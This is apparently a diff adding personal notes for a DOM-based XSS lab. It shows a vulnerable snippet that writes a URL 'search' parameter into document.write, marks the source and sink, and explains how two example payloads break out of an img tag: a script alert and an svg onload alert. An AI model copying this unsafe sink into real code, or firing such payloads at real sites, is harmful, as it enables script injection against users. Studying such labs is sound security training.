@@ -1,0 +1,39 @@
+// Lab-3 Dom XSS  (Source && Sync )  
+
+// notes: In Dom There is no involment of the server, All the content is processed by the client side javascript.     
+
+
+<script>
+    function trackSearch(query) {
+        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');     // quary is added here 
+    }                                                                                         // sync area 
+  
+  
+    var query = (new URLSearchParams(window.location.search)).get('search');    
+    if(query) {
+        trackSearch(query);                                    //source area
+    }
+</script> 
+
+
+
+
+// creating payload :   
+
+<img src="/resources/images/tracker.gif?searchTerms='+query+'">    
+
+
+' ' :- first colon is the programming logic  
+ 
+">  :- completing the image tag 
+
+<script> alert (0) </script>   :- Adding the payload  
+
+
+
+// Example payloads 
+
+"> <script> alert(0) </script>  
+
+"> <svg onload=alert(1)>     
+
